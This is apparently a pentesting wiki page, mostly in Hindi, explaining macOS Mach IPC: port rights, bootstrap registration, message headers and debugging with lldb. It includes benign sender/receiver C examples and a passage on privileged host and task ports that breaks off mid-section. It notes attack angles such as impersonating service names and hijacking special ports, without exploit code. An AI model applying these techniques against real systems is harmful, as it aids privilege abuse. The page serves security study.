# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach संसाधन साझा करने के लिए tasks का उपयोग करता है, और प्रत्येक task में कई threads हो सकते हैं। ये tasks और threads POSIX processes और threads से 1:1 मैप होते हैं।

Tasks के बीच संचार Mach Inter-Process Communication (IPC) के माध्यम से होता है, जो एक-तरफा कम्युनिकेशन चैनलों का उपयोग करता है। Messages ports के माध्यम से ट्रांसफर होते हैं, जो kernel द्वारा मैनेज किए जाने वाले प्रकार के message queues की तरह काम करते हैं।

एक port Mach IPC का मूल तत्व है। इसका उपयोग संदेश भेजने और प्राप्त करने दोनों के लिए किया जा सकता है।

प्रत्येक process के पास एक IPC table होता है, जहाँ process के mach ports मिल सकते हैं। एक mach port का नाम वास्तव में एक संख्या है (kernel object के लिए pointer)।

एक process किसी दूसरे task को कुछ rights के साथ port name भी भेज सकता है और kernel यह entry दूसरी task के IPC table में बना देगा।

### Port Rights

Port rights, जो यह परिभाषित करते हैं कि कोई task कौन से operations कर सकता है, इस संचार के लिए महत्वपूर्ण हैं। संभावित port rights हैं ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Receive right**, जो पोर्ट को भेजे गए संदेशों को प्राप्त करने की अनुमति देता है। Mach ports MPSC (multiple-producer, single-consumer) queues हैं, जिसका अर्थ है कि पूरे सिस्टम में किसी भी पोर्ट के लिए केवल एक ही **receive right** हो सकती है (pipes के विपरीत, जहाँ कई processes एक pipe के read end के file descriptors रख सकते हैं)।
- एक task जिसके पास Receive right है, वह संदेश प्राप्त कर सकता है और **Send rights** बना सकता है, जिससे वह संदेश भेज सके। मूल रूप से केवल अपना task ही अपने port पर Receive right रखता है।
- यदि Receive right का मालिक मर जाता है या इसे समाप्त कर देता है, तो **send right बेकार (dead name) हो जाती है।**
- **Send right**, जो पोर्ट पर संदेश भेजने की अनुमति देता है।
- Send right को **cloned** किया जा सकता है ताकि एक task जो Send right का मालिक है वह इस right को cloned करके किसी तीसरे task को दे सके।
- ध्यान दें कि **port rights** Mac messages के माध्यम से भी पास की जा सकती हैं।
- **Send-once right**, जो पोर्ट पर एक ही संदेश भेजने की अनुमति देता है और फिर गायब हो जाता है।
- यह right **cloned** नहीं की जा सकती, पर इसे **moved** किया जा सकता है।
- **Port set right**, जो एक single port के बजाय एक _port set_ को दर्शाता है। किसी port set से एक संदेश dequeue करने पर उसके शामिल पोर्ट्स में से किसी एक से संदेश dequeue होता है। Port sets का उपयोग कई पोर्ट्स पर एक साथ सुनने के लिए किया जा सकता है, ठीक Unix में `select`/`poll`/`epoll`/`kqueue` की तरह।
- **Dead name**, जो वास्तव में कोई पोर्ट राइट नहीं है, बस एक placeholder है। जब एक पोर्ट नष्ट हो जाता है, तो उस पोर्ट के सभी मौजूदा port rights dead names में बदल जाते हैं।

**Tasks SEND rights दूसरों को ट्रांसफर कर सकते हैं**, जिससे वे संदेश वापस भेज सकें। **SEND rights को clone भी किया जा सकता है, इसलिए एक task यह right डुप्लिकेट करके तीसरे task को दे सकता है।** यह, एक मध्यस्थ process जिसे **bootstrap server** कहा जाता है, के साथ मिलकर, tasks के बीच प्रभावी संचार की अनुमति देता है।

### File Ports

File ports file descriptors को Mac ports में encapsulate करने की अनुमति देते हैं (Mach port rights का उपयोग करके)। किसी दिए गए FD से `fileport_makeport` का उपयोग करके `fileport` बनाया जा सकता है और fileport से FD बनाने के लिए `fileport_makefd` का उपयोग किया जा सकता है।

### Establishing a communication

जैसा कि पहले बताया गया है, Mach messages का उपयोग करके rights भेजना संभव है, हालांकि आप एक right भेज नहीं सकते जब तक कि आपके पास पहले से Mach message भेजने का right न हो। तो पहली बातचीत कैसे स्थापित होती है?

इसके लिए, **bootstrap server** (**launchd** mac में) शामिल होता है, क्योंकि **हर कोई bootstrap server के लिए SEND right प्राप्त कर सकता है**, इसलिए यह किसी अन्य process को संदेश भेजने का right माँगने के लिए प्रयोग किया जाता है:

1. Task **A** एक **नया port** बनाती है, और उस पर **RECEIVE right** प्राप्त करती है।
2. Task **A**, RECEIVE right का धारक होने के नाते, उस पोर्ट के लिए **SEND right** उत्पन्न करता है।
3. Task **A** bootstrap server के साथ **कनेक्शन** स्थापित करती है, और उस पोर्ट के लिए **SEND right भेजती है** जिसे उसने शुरुआत में बनाया था।
- याद रखें कि कोई भी bootstrap server के लिए SEND right प्राप्त कर सकता है।
4. Task A `bootstrap_register` message भेजता है bootstrap server को ताकि दिए गए पोर्ट को `com.apple.taska` जैसे नाम के साथ **associate** किया जा सके।
5. Task **B** bootstrap server से सेवा नाम के लिए एक bootstrap **lookup** करता है (`bootstrap_lookup`)। ताकि bootstrap server जवाब दे सके, task B lookup message के अंदर पहले से बनाए गए किसी पोर्ट का **SEND right भेजेगा**। यदि lookup सफल होता है, तो **server Task A से प्राप्त SEND right को duplicate करता है और Task B को ट्रांसमिट करता है**।
- याद रखें कि कोई भी bootstrap server के लिए SEND right प्राप्त कर सकता है।
6. इस SEND right के साथ, **Task B** **Task A** को **message भेजने** में सक्षम होता है।
7. द्वि-दिशात्मक संचार के लिए सामान्यतः task **B** एक नया पोर्ट बनाता है जिसमें **RECEIVE** right और **SEND** right दोनों होते हैं, और **SEND right Task A को देता है** ताकि Task A TASK B को संदेश भेज सके (बाय-डायरेक्शनल कम्युनिकेशन)।

bootstrap server सेवा नाम का दावा करने वाले task को authenticate नहीं कर सकता। इसका मतलब है कि कोई भी task सम्भवतः किसी भी system task का impersonate कर सकता है, जैसे कि गलत तरीके से किसी authorization service name का दावा करना और फिर हर अनुरोध को 승인 करना।

इसके बाद, Apple system-provided services के नाम secure configuration files में स्टोर करता है, जो कि **SIP-protected** directories में स्थित हैं: `/System/Library/LaunchDaemons` और `/System/Library/LaunchAgents`। हर सेवा नाम के साथ associated binary भी स्टोर होती है। bootstrap server इन predefined सेवा नामों के लिए एक RECEIVE right बनाएगा और रखेगा।

इन predefined सेवाओं के लिए, lookup प्रक्रिया थोड़ी भिन्न होती है। जब किसी सेवा नाम को lookup किया जा रहा होता है, तो launchd सेवा को dynamic रूप से शुरू कर देता है। नया वर्कफ़्लो इस प्रकार है:

- Task **B** किसी सेवा नाम के लिए bootstrap **lookup** शुरू करता है।
- **launchd** जाँचता है कि task चल रहा है या नहीं, और अगर नहीं चल रहा होता है तो इसे **start** कर देता है।
- Task **A** (service) एक **bootstrap check-in** (`bootstrap_check_in()`) करता है। यहाँ, **bootstrap** server एक SEND right बनाता है, उसे रखता है, और **RECEIVE right Task A को ट्रांसफर** कर देता है।
- launchd उस SEND right को duplicate करता है और इसे Task B को भेज देता है।
- Task **B** एक नया पोर्ट बनाता है जिसमें **RECEIVE** right और **SEND** right होता है, और **SEND right Task A (the svc) को देता है** ताकि वह TASK B को संदेश भेज सके (बाय-डायरेक्शनल कम्युनिकेशन)।

हालाँकि, यह प्रक्रिया केवल predefined system tasks पर लागू होती है। Non-system tasks अभी भी मूल रूप से पहले बताए गए तरीके से काम करते हैं, जो संभवतः impersonation की अनुमति दे सकता है।

> [!CAUTION]
> इसलिए, launchd कभी crash नहीं होना चाहिए वरना पूरा सिस्टम crash हो जाएगा।

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` function, जो कि मूलतः एक system call है, Mach messages भेजने और प्राप्त करने के लिए उपयोग की जाती है। इस function को भेजे जाने वाले संदेश को प्रारंभिक argument के रूप में दिया जाना चाहिए। यह संदेश `mach_msg_header_t` structure से शुरू होना चाहिए, जिसके बाद वास्तविक संदेश सामग्री आती है। संरचना निम्नलिखित के रूप में परिभाषित है:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

The initial field **`msgh_bits`** is a bitmap:

- First bit (most significative) is used to indicate that a message is complex (more on this below)
- The 3rd and 4th are used by the kernel
- The **5 least significant bits of the 2nd byte** from can be used for **voucher**: another type of port to send key/value combinations.
- The **5 least significant bits of the 3rd byte** from can be used for **local port**
- The **5 least significant bits of the 4th byte** from can be used for **remote port**

The types that can be specified in the voucher, local and remote ports are (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.

आसान **bi-directional communication** प्राप्त करने के लिए एक प्रक्रिया mach **message header** में एक **mach port** निर्दिष्ट कर सकती है जिसे _reply port_ (**`msgh_local_port`**) कहा जाता है, जहाँ संदेश का **receiver** इस संदेश का **reply भेज** सकता है।

> [!TIP]
> ध्यान दें कि इस प्रकार का दो-मार्गी संचार XPC messages में उपयोग होता है जो reply की उम्मीद करते हैं (`xpc_connection_send_message_with_reply` और `xpc_connection_send_message_with_reply_sync`)। लेकिन **आम तौर पर अलग-अलग ports बनाए जाते हैं** जैसा कि पहले समझाया गया था, ताकि दो-मार्गी संचार बनाया जा सके।

The other fields of the message header are:

- `msgh_size`: पूरे पैकेट का आकार।
- `msgh_remote_port`: वह port जिस पर यह संदेश भेजा जाता है।
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: इस संदेश का ID, जिसे प्राप्तकर्ता द्वारा व्याख्यायित किया जाता है।

> [!CAUTION]
> ध्यान दें कि **mach messages are sent over a `mach port`**, जो mach kernel में निर्मित एक **single receiver**, **multiple sender** संचार चैनल है। **Multiple processes** एक mach port को **send messages** कर सकते हैं, पर किसी भी समय केवल **a single process can read** कर सकता है।

Messages तब बनते हैं `mach_msg_header_t` header द्वारा, जिसके बाद **body** और **trailer** (यदि कोई हो) आता है और यह इसे reply करने की अनुमति दे सकता है। ऐसे मामलों में, kernel को बस संदेश को एक task से दूसरे task को पास करना होता है।

एक **trailer** वह **information है जिसे kernel संदेश में जोड़ता है** (उपयोगकर्ता द्वारा सेट नहीं किया जा सकता) जिसे message reception में flags `MACH_RCV_TRAILER_<trailer_opt>` के साथ अनुरोध किया जा सकता है (विभिन्न प्रकार की जानकारी अनुरोध की जा सकती है)।

#### Complex Messages

हालाँकि, अन्य अधिक **complex** messages भी होती हैं, जैसे कि वे जो अतिरिक्त port rights पास करते हैं या memory साझा करते हैं, जहाँ kernel को इन objects को recipient को भेजने की भी आवश्यकता होती है। इन मामलों में header `msgh_bits` का सबसे महत्वपूर्ण bit सेट किया जाता है।

The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32bits, all the descriptors are 12B and the descriptor type is in the 11th one. In 64 bits, the sizes vary.

> [!CAUTION]
> Kernel descriptors को एक task से दूसरे task में copy करेगा लेकिन पहले **kernel memory में एक copy बनाने** के बाद। यह तकनीक, जिसे "Feng Shui" कहा जाता है, कई exploits में दुरुपयोग की गई है ताकि **kernel अपने memory में data कॉपी करे** और एक process को descriptors खुद को भेजने के लिए मजबूर करे। फिर process messages receive कर सकता है (kernel उन्हें free कर देगा).
>
> यह भी संभव है कि आप किसी vulnerable process को **send port rights to a vulnerable process** कर दें, और port rights बस process में प्रकट हो जाएँगे (भले ही वह उन्हें handle ना कर रहा हो)।

### Mac Ports APIs

ध्यान दें कि ports task namespace से जुड़े होते हैं, इसलिए किसी port को create या खोजने के लिए task namespace भी query किया जाता है (more in `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: एक पोर्ट **Create** करता है।
- `mach_port_allocate` किसी **port set** को भी बना सकता है: ports के समूह पर receive right। जब भी कोई message received होता है तो यह बताता है कि वह किस port से आया था।
- `mach_port_allocate_name`: port का नाम बदलता है (by default 32bit integer)
- `mach_port_names`: किसी target से port names प्राप्त करें
- `mach_port_type`: किसी name पर task के rights प्राप्त करें
- `mach_port_rename`: एक port का नाम बदलें (FDs के लिए dup2 की तरह)
- `mach_port_allocate`: नया RECEIVE, PORT_SET या DEAD_NAME allocate करें
- `mach_port_insert_right`: उस port में नया right बनाएं जहाँ आपके पास RECEIVE है
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: वे functions हैं जिनका उपयोग mach messages को **send और receive** करने के लिए होता है। overwrite version message reception के लिए अलग buffer specify करने की अनुमति देता है (दूसरा version बस इसे reuse करेगा)।

### Debug mach_msg

चूंकि functions **`mach_msg`** और **`mach_msg_overwrite`** mach messages को भेजने और प्राप्त करने के लिए उपयोग होते हैं, इन पर breakpoint सेट करने से भेजे और प्राप्त किए गए messages का निरीक्षण करना संभव होगा।

उदाहरण के लिए किसी भी application को debug करना शुरू करें जिसे आप debug कर सकते हैं क्योंकि यह **`libSystem.B` लोड करेगा जो इस function का उपयोग करेगा**।

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

mach_msg के arguments प्राप्त करने के लिए registers चेक करें। ये arguments हैं (from [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
रजिस्ट्रियों से मान प्राप्त करें:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
पहले आर्ग्युमेंट की जाँच करते हुए संदेश हेडर का निरीक्षण करें:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
उस प्रकार का `mach_msg_bits_t` आमतौर पर उत्तर की अनुमति देने के लिए बहुत सामान्य है।

### पोर्ट्स को सूचीबद्ध करना
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**नाम** पोर्ट को दिया गया डिफ़ॉल्ट नाम है (देखें कि यह पहले 3 बाइट्स में कैसे **बढ़ रहा है**)। **`ipc-object`** पोर्ट का **गोपित** अद्वितीय **पहचानकर्ता** है.\
यह भी ध्यान दें कि जिन पोर्ट्स के पास केवल **`send`** अधिकार होते हैं वे इसके **मालिक की पहचान** करते हैं (port name + pid).\
यह भी ध्यान दें कि **`+`** का उपयोग यह संकेत करने के लिए होता है कि **इसी पोर्ट से जुड़े अन्य टास्क मौजूद हैं**।

यह भी संभव है कि [**procesxp**](https://www.newosxbook.com/tools/procexp.html) का उपयोग करके आप **पंजीकृत सेवा नाम** भी देख सकें (SIP को निष्क्रिय करना आवश्यक है क्योंकि `com.apple.system-task-port` की आवश्यकता होती है):
```
procesp 1 ports
```
आप इस टूल को iOS में [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) से डाउनलोड करके इंस्टॉल कर सकते हैं

### कोड उदाहरण

ध्यान दें कि **sender** एक पोर्ट **allocates** करता है, नाम `org.darlinghq.example` के लिए एक **send right** बनाता है और इसे **bootstrap server** को भेजता है, जबकि **sender** ने उस नाम के **send right** के लिए अनुरोध किया था और इसका उपयोग **send a message** करने के लिए किया।

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privileged Ports

कुछ विशेष पोर्ट होते हैं जो यह अनुमति देते हैं कि यदि किसी टास्क के पास उन पर **SEND** अनुमति हो तो वे **कुछ संवेदनशील कार्य कर सकें या कुछ संवेदनशील डेटा तक पहुँच प्राप्त कर सकें**। यह इन्हें हमलावर के दृष्टिकोण से न सिर्फ उनकी क्षमताओं के कारण बल्कि इसलिए भी रोचक बनाता है कि **SEND अनुमतियों को टास्क्स के बीच साझा करना** संभव है।

### Host Special Ports

ये पोर्ट एक संख्या द्वारा प्रतिनिधित्व किए जाते हैं।

**SEND** अधिकार **`host_get_special_port`** कॉल करके प्राप्त किए जा सकते हैं और **RECEIVE** अधिकार **`host_set_special_port`** कॉल करके। हालांकि, दोनों कॉल्स के लिए **`host_priv`** पोर्ट की आवश्यकता होती है जिसे केवल root एक्सेस कर सकता है। इसके अलावा, पहले root `host_set_special_port` को कॉल कर सकता था और मनमाने ढंग से hijack कर सकता था जिससे, उदाहरण के लिए, `HOST_KEXTD_PORT` को hijack करके code signatures को बायपास करना संभव था (अब SIP इसे रोकता है)।

ये 2 समूहों में बटे होते हैं: पहले 7 पोर्ट्स kernel के स्वामित्व वाले हैं, जो कि 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` और 7 `HOST_MAX_SPECIAL_KERNEL_PORT` हैं.\
नंबर **8** से शुरू होने वाले पोर्ट्स system daemons के स्वामित्व वाले हैं और इन्हें [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) में घोषित पाया जा सकता है।

- **Host port**: यदि किसी प्रक्रिया के पास इस पोर्ट पर **SEND** विशेषाधिकार है तो वह इस पोर्ट की रूटीन कॉल करके सिस्टम के बारे में **जानकारी** प्राप्त कर सकता है, जैसे:
- `host_processor_info`: प्रोसेसर की जानकारी प्राप्त करें
- `host_info`: होस्ट जानकारी प्राप्त करें
- `host_virtual_physical_table_info`: Virtual/Physical page table (के लिए MACH_VMDEBUG आवश्यक है)
- `host_statistics`: होस्ट सांख्यिकी प्राप्त करें
- `mach_memory_info`: कर्नेल मेमोरी लेआउट प्राप्त करें
- **Host Priv port**: किसी प्रक्रिया के पास इस पोर्ट पर **SEND** अधिकार होने पर वह **privileged actions** कर सकती है, जैसे बूट डेटा दिखाना या कर्नेल एक्सटेंशन लोड करने की कोशिश करना। इस अनुमति को पाने के लिए **प्रक्रिया को root होना जरूरी है**।
- इसके अतिरिक्त, `kext_request` API को कॉल करने के लिए अन्य entitlements **`com.apple.private.kext*`** की आवश्यकता होती है जो केवल Apple बाइनरीज़ को दिए जाते हैं।
- अन्य रूटीन जो कॉल की जा सकती हैं:
- `host_get_boot_info`: `machine_boot_info()` प्राप्त करें
- `host_priv_statistics`: privileged statistics प्राप्त करें
- `vm_allocate_cpm`: Contiguous Physical Memory allocate करें
- `host_processors`: host processors को Send right भेजें
- `mach_vm_wire`: मेमोरी को resident बनाना
- चूंकि **root** इस अनुमति को एक्सेस कर सकता है, यह `host_set_[special/exception]_port[s]` कॉल करके **host special या exception ports को hijack** कर सकता है।

यह संभव है कि आप निम्न चलाकर **सभी होस्ट स्पेशल पोर्ट्स देख सकें**:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

ये परिचित सेवाओं के लिए रिज़र्व किए गए ports हैं। इन्हें `task_[get/set]_special_port` कॉल करके get/set किया जा सकता है। इन्हें `task_special_ports.h` में पाया जा सकता है:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: यह पोर्ट इस task को नियंत्रित करने के लिए उपयोग होता है। task को प्रभावित करने वाले संदेश भेजने के लिए इस्तेमाल होता है। यह वह पोर्ट है जिसे **mach_task_self (see Task Ports below)** लौटाता है।
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: task का bootstrap पोर्ट। अन्य system service पोर्ट्स वापस माँगने वाले संदेश भेजने के लिए इस्तेमाल होता है।
- **TASK_HOST_NAME_PORT**\[host-self send right]: उस host की जानकारी माँगने के लिए उपयोग होने वाला पोर्ट जिसमें यह task मौजूद है। यह वह पोर्ट है जिसे **mach_host_self** लौटाता है।
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: वह पोर्ट जो इस task के लिए wired kernel memory का स्रोत नामित करता है।
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: वह पोर्ट जो इस task के लिए default managed memory का स्रोत नामित करता है।

### Task Ports

Originally Mach में "processes" नहीं थे, बल्कि "tasks" थे जिन्हें threads के container जैसा माना जाता था। जब Mach को BSD के साथ मिलाया गया था तो **प्रत्येक task को एक BSD process के साथ जोड़ा गया**। इसलिए हर BSD process के पास वह जानकारी होती है जो उसे एक process होने के लिए चाहिए और हर Mach task के भी अपने आंतरिक कामकाज होते हैं (सिवाय उस मौजूद न होने वाले pid 0 के जो `kernel_task` है)।

इसके साथ जुड़ी दो बहुत दिलचस्प functions हैं:

